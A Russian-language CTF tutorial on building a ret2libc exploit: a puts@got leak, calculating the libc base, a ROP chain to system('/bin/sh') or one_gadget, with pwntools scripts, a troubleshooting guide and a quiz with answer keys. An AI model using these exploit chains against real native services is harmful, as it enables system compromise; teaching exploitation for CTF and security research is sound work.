---
id: pwn-ret2libc
title: "ret2libc и one_gadget"
category: pwn
parent: pwn-got-plt
difficulty: hard
order: 1
tags: [ret2libc, libc, leak, one_gadget, system]
prerequisites: [pwn-got-plt, pwn-rop]
useful_for:
  - "CTF Pwn категория"
  - "Обход ASLR"
  - "Vulnerability research"
estimated_minutes: 60
summary: "Строим полноценный эксплойт: утекаем libc, вычисляем базу и вызываем system('/bin/sh') или one_gadget — обход ASLR через ret2libc."
---
**ret2libc** — базовый и самый частый приём бинарной эксплуатации: переполнение стека + вызов `system("/bin/sh")` из libc. Проблема — ASLR: адрес `system` рандомизирован при каждом запуске, поэтому сначала **утекаем** адрес libc (через GOT или format string), вычисляем базу и только затем вызываем. Это полноценный эксплойт с двумя round-trip, и он — обязательный навык для любой задачи с NX и включённым ASLR.

## Почему нужен leak

- libc загружается по случайному адресу (ASLR) — при каждом запуске своя база.
- Чтобы вызвать `system`, нужно знать `libc_base + system_offset` (офсет фиксирован для данной libc).
- Утечка: прочитать GOT-запись **уже вызванной** функции (`puts@got`) — там лежит её реальный адрес.
- Зная реальный адрес `puts` и его офсет в libc, вычисляем `libc_base = leak - puts_offset`.

## Триаж и смещение до RIP

```bash
checksec --file=./chall
# Arch: amd64-64-little
# RELRO: Partial RELRO
# Stack: No canary found
# NX:    NX enabled
# PIE:   No PIE (0x400000)
```

Non-PIE, NX, без canary, с ASLR и без `win()` → единственный путь — ret2libc. Находим смещение до адреса возврата:

```bash
python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pat
gdb -q ./chall -ex 'run < /tmp/pat' -ex 'info registers rip'
# RIP = 0x6161616c (перезаписан паттерном)
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"   # -> 72
```

Смещение 72 = размер буфера (64) + сохранённый RBP (8).

## Round 1: утечка libc через puts

Возвращаемся в `main`, чтобы получить второй ввод. `main` в non-PIE имеет фиксированный адрес, `puts@plt`/`puts@got` — из таблиц ELF:

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6')

p = process('./chall')
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])   # puts(puts@got) -> печатает реальный адрес
rop.call(elf.symbols['main'])                 # вернуться в main для round 2
p.sendlineafter(b'>', flat({72: rop.chain()}))

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base = {hex(libc.address)}')
```

`rop.call(plt, [got])` собирает цепочку: `pop rdi; ret` (для аргумента) + `puts@plt` + адрес возврата `main`. `u64(...ljust(8, b'\x00'))` дополняет утечку до 8 байт (puts печатает до нуля).

## Round 2: system("/bin/sh")

```python
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendlineafter(b'>', flat({72: rop2.chain()}))
p.interactive()
```

`ROP(libc)` использует уже установленный `libc.address` для вычисления абсолютных адресов гаджетов и символов. Строку `/bin/sh` ищем в самой libc (`libc.search`).

## One-gadget

Если нет удобного `pop rdi` или строки `/bin/sh`, используют **one_gadget** — адрес внутри libc, вызывающий `execve("/bin/sh")` при выполнении условий:

```bash
one_gadget ./libc.so.6
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints: [r15] == NULL || r15 == NULL || r12 == NULL
```

```python
one = libc.address + 0xe3afe
payload = flat({72: p64(one)})
```

Проверьте ограничения (нулевые регистры/память) — часто нужно «обнулить» их предыдущими гаджетами (`pop r15; ret`). One-gadget удобен, когда нет места под длинную цепочку.

## Определение версии libc

Если libc не дана, используйте утечку + `libc-database`:

```bash
./find puts 6f0            # поиск по последним 3 нибблам адреса puts
./find printf f7a0 b40
```

Собрав кандидатов, проверьте их на совпадение второго leak (например, `__libc_start_main`). См. `pwn-libc-database`.

## Разобранный пример: от триажа до shell

```text
Шаг 1. checksec: NX enabled, No canary, No PIE, Partial RELRO.
Шаг 2. cyclic -> смещение 72 до RIP.
Шаг 3. Round 1: puts(puts@got) + return to main -> leak -> libc_base.
Шаг 4. Round 2: system("/bin/sh") -> interactive.
Шаг 5. Стабилизация: выравнивание стека, повторный leak при нестабильности.
```

Важная деталь: `main` в non-PIE имеет фиксированный адрес, а `puts@plt`/`puts@got` берутся из таблиц ELF — поэтому возврат в `main` возможен без знания базы бинаря.

**Стабилизация.** Если shell не поднимается:

- **Выравнивание стека.** Добавьте лишний `ret`-гаджет перед `system` (SSE/`movaps` требует 16-байтного выравнивания).
- **Корректность утечки.** Первая строка вывода может содержать мусор — используйте `recvuntil`.
- **`puts` съел лишние байты.** Проверьте формат ответа.
- **Отладка.** `gdb.attach(p, 'b system\nc')`.

## Варианты, когда классический ret2libc не работает

- **Нет гаджета `pop rdi`.** Используйте **ret2csu** (`__libc_csu_init` содержит гаджеты для RDI/RSI/RDX) или поищите `pop rdi; ret` в libc (если её база известна). См. `pwn-ret2csu`.
- **Нет строки `/bin/sh` в libc.** Запишите её в `.bss` через `read` (цепочка: `read(0, bss, 8)` → `system(bss)`), либо используйте `/bin/sh` из другой загруженной библиотеки.
- **Статическая линковка (нет libc).** Переходите на **ret2syscall**: `rax=59 (execve)`, `rdi=/bin/sh`, `rsi=0`, `rdx=0`, `syscall`. Или ORW (open/read/write) при seccomp. См. `pwn-static-no-libc`.
- **seccomp запрещает execve.** Тогда только ORW: `open("flag")`, `read`, `write`. См. `pwn-seccomp-srop`.
- **Canary.** Сначала утечь canary (через `puts`/форматную строку) и восстановить её в payload. См. `pwn-canary-bypass`.
- **PIE + no leak.** Нужна утечка базы бинаря (например, через форматную строку или `puts` адреса в `.text`). См. `pwn-pie-bypass`.
- **Утечка через форматную строку.** Если есть `printf(buf)` и нет удобного `puts`, используйте `%p`/`%s` для чтения GOT. См. `pwn-format-string`.

## Справочник: офсеты и гаджеты

Типичные шаги при работе с libc:

```python
from pwn import *
libc = ELF('./libc.so.6')
print(hex(libc.symbols['system']))          # офсет system
print(hex(libc.symbols['puts']))            # офсет puts (для leak)
print(hex(next(libc.search(b'/bin/sh'))))   # офсет строки
rop = ROP(libc)
print(rop.find_gadget(['pop rdi', 'ret']))  # гаджет pop rdi; ret
```

| Что | Как получить |
|-----|--------------|
| `libc_base` | `leak_puts - libc.symbols['puts']` |
| `system` | `libc_base + libc.symbols['system']` |
| `/bin/sh` | `libc_base + next(libc.search(b'/bin/sh'))` |
| `pop rdi; ret` | `libc_base + rop.find_gadget(['pop rdi','ret']).address` |
| one_gadget | `libc_base + <offset из one_gadget>` |

Проверка совпадения libc: сравните **два** leak (например, `puts` и `__libc_start_main`) — совпадение обоих подтверждает версию.

## Частые ошибки

- **Неверный офсет до RIP.** `cyclic_find` обязателен — «на глаз» почти всегда мимо.
- **Не та libc.** Офсеты различаются; определите версию (libc-database).
- **Не сбросить `libc.address`.** `libc.symbols[...]` вернёт офсет, а не адрес — устанавливайте базу.
- **Забыть вернуться в main.** Без второго round-trip нельзя вызвать `system` после утечки.
- **One-gadget без условий.** Падает, если constraints не выполнены.
- **Canary.** При включённой canary нужен её обход (см. `pwn-canary-bypass`).
- **Выравнивание.** Лишний `ret` перед `system` (SSE) — классическая причина краха.

## Что делать дальше / решение

1. `checksec` + определение смещения (`cyclic`).
2. Round 1: утечка `puts@got`, возврат в `main`.
3. Вычисление `libc_base`; при неизвестной libc — подбор через libc-database.
4. Round 2: `system("/bin/sh")` или one_gadget.
5. Стабилизация: выравнивание, корректный парсинг утечки.
6. Переход к интерактивной сессии; при canary/PIE — предварительный обход.


## Финальные рекомендации по ret2libc

Ключевые шаги: (1) утеките адрес libc-функции (через `puts@got`/format string); (2) определите версию libc (`libc-database`/`libc.rip`); (3) вычислите базу (`libc.address = leak - offset`); (4) найдите гаджеты (`pop rdi; ret`) и адреса `system`/`"/bin/sh"`; (5) соберите цепочку с учётом выравнивания стека. Проверяйте локально на той же libc. Практикуйтесь — ret2libc встречается повсеместно.


## Полный разбор ret2libc-эксплойта

Разберём сквозной пример. Дано: 64-битный бинарь с переполнением, NX, ASLR, PIE (с утечкой базы). Цель — `system("/bin/sh")`. Шаги: (1) найдите offset до сохранённого RIP (cyclic + gdb); (2) найдите гаджет `pop rdi; ret`; (3) постройте первый этап: утечка `puts@got` через вызов `puts(puts@got)` и возврат в `main` (для второго этапа); (4) получите утечку, определите libc (`libc-database`); (5) вычислите `libc.address = leak - libc.symbols['puts']`; (6) найдите `system` и `"/bin/sh"`; (7) постройте второй этап: `pop rdi; binsh; ret (выравнивание); system`. Проверяйте локально на той же libc. Помните про выравнивание стека (лишний `ret`) и про то, что `system` требует `rdi = "/bin/sh"`. Если `system` нет, используйте `one_gadget` или `execve`. Практикуйтесь: ret2libc — базовый навык, встречающийся повсеместно.

## Разбор утечки через GOT и повторный вызов main

Первый этап ret2libc часто строят так: переполнение возвращает управление на `puts@plt` с аргументом `puts@got` (через `pop rdi; ret`), затем возвращает в `main` для второго раунда. `puts` печатает 8 байт адреса `puts` из GOT, вы читаете их (`u64(p.recvline().strip().ljust(8,b'\x00'))`), вычисляете базу libc и строите второй payload. Важно: при возврате в `main` стек должен быть корректным, а выравнивание — учтено. Если `main` не подходит (например, меняет состояние), вернитесь в начало уязвимой функции. Для 32-битных бинарей аргументы передаются на стеке, что упрощает цепочку (не нужны `pop rdi`). Практикуйтесь на обоих вариантах — ret2libc фундаментален.


## Дополнительно

Помните, что `libc.symbols` дают смещения только после установки `libc.address`; до этого они относительны. Проверяйте, что утечка действительно из libc (адреса начинаются с `0x7f`), а не из PIE-бинаря. При выравнивании добавляйте один `ret` перед вызовом функции, если стек смещён. Практикуйтесь, и ret2libc станет для вас рутиной.

## Квиз

```quiz
- question: "Зачем в ret2libc нужна утечка libc?"
  options:
    - "Адрес system рандомизирован ASLR — нужна база libc"
    - "Чтобы отключить NX"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "ASLR рандомизирует базу libc; утечка даёт реальные адреса."
- question: "Что утекают в первом round-trip?"
  options:
    - "GOT-запись уже вызванной функции (например, puts@got)"
    - "Canary"
    - "Стек"
    - "heap base"
  answer: 0
  explanation: "puts@got содержит реальный адрес puts, по нему вычисляют базу libc."
- question: "Что делает ROP(libc) после установки libc.address?"
  options:
    - "Вычисляет абсолютные адреса гаджетов/символов libc"
    - "Собирает бинарь"
    - "Отключает ASLR"
    - "Сканирует порты"
  answer: 0
  explanation: "ROP(libc) использует libc.address как базу для адресов."
- question: "Что такое one_gadget?"
  options:
    - "Адрес в libc, вызывающий execve('/bin/sh') при выполнении условий"
    - "Первый гаджет ROP"
    - "Одноразовый токен"
    - "Флаг сборки"
  answer: 0
  explanation: "one_gadget упрощает получение shell, если соблюдены constraints."
- question: "Почему нужен второй round-trip?"
  options:
    - "Сначала утекаем libc, затем возвращаемся в main для вызова system"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "После утечки возврат в main позволяет отправить второй payload с system."
```

## Где пригодится

- **CTF:** Pwn — базовый приём любой задачи с NX.
- **Bug bounty:** эксплуатация нативных сервисов.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
